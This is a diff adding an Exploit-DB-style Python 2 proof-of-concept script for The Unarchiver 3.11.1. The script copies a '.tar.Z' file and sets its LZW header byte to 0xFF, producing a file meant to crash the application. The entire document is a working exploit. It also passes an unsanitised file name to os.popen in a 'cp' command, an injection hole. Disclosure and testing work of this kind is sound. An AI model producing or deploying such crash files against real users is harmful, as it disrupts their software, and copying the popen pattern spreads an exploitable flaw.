@@ -1,0 +1,39 @@
+# Exploit Title: The Unarchiver 3.11.1 '.tar.Z' Local Crash PoC
+# Date: 10-17-2016
+# Exploit Author: Antonio Z.
+# Vendor Homepage: http://unarchiver.c3.cx/unarchiver
+# Software Link: http://unarchiver.c3.cx/downloads/TheUnarchiver3.11.1.zip
+# Version: 3.11.1
+# Tested on: OS X 10.10, OS X 10.11, OS X 10.12
+
+# More information: https://opensource.apple.com/source/gnuzip/gnuzip-11/gzip/lzw.h
+
+import os, struct, sys
+from mmap import mmap
+
+if len(sys.argv) <= 1:
+    print "Usage: python Local_Crash_PoC.py [file name]"
+    exit()
+
+file_name = sys.argv[1]
+file_mod = open(file_name, 'r+b')
+file_hash = file_mod.read()
+
+def get_extension(file_name):
+    basename = os.path.basename(file_name)
+    extension = '.'.join(basename.split('.')[1:])
+    return '.' + extension if extension else None
+
+def file_maping():
+    maping = mmap(file_mod.fileno(),0)
+    maping.seek(2)
+    maping.write_byte(struct.pack('B', 255))
+    maping.close()
+    
+new_file_name = "Local_Crash_PoC" + get_extension(file_name)
+    
+os.popen('cp ' + file_name + ' ' + new_file_name)
+file_mod = open(new_file_name, 'r+b')
+file_maping()
+file_mod.close()
+print '[+] ' + 'Created file: ' + new_file_name
